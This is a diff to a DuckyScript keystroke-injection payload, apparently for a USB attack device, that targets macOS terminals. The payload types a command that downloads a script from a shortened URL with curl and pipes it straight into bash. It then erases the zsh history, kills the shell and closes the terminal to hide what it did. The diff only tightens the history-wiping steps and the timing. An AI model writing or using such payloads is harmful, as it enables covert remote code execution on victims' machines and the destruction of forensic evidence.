@@ -15,32 +15,17 @@ DELAY 100
 
 REM     Delete anything that might have been typed in
 CTRL u
+DELAY 100
 REM     Run payload
 STRING export dc=''; curl -sSL https://bit.ly/iposx | bash
 ENTER
 DELAY 200
 
-REM History deletion US keyboard
 REM clear terminal history
-STRING rm ~/.bash_history
+STRING echo > ~/.zsh_history && kill -9 $$
 ENTER
-DELAY 100
-
-STRING rm ~/.zsh_history
-ENTER
-DELAY 100
-
-REM History deletion for International keyboard
-REM clear terminal history
-STRING rm ~ /.bash_history
-ENTER
-DELAY 100
-
-STRING rm ~ /.zsh_history
-ENTER
-DELAY 100
-
+DELAY 150
 
 REM close terminal
-GUI w
+GUI q
 ENTER
